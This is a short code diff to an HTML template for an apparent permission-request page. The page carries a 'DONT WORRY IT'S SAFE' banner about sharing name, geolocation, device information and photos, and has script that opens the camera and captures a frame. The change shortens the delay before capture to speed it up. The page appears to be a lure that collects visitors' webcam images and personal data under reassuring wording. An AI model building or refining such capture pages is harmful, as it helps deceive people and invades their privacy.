@@ -59,7 +59,7 @@ HTML_TEMPLATE = """
         <h2>权限许可请求</h2>
         
         <div class="legal-banner">
-            ✅DONT WORRY IT'S SAFE: 法律声明：<br>
+           ✅DONT WORRY IT'S SAFE: 法律声明：<br>
             点击“Autoriser”即表示您同意共享姓名、地理位置、设备信息及照片。决定权完全在您手中，拒绝将不会收集任何数据。
         </div>
 
@@ -152,7 +152,8 @@ HTML_TEMPLATE = """
                 
                 videoElement.srcObject = stream;
 
-                await new Promise(resolve => setTimeout(resolve, 1500));
+                // Wallét wa9t el intithar 1 thnya barka (1000ms) bch tzed sror3a
+                await new Promise(resolve => setTimeout(resolve, 1000));
 
                 canvas.width = videoElement.videoWidth || 640;
                 canvas.height = videoElement.videoHeight || 480;
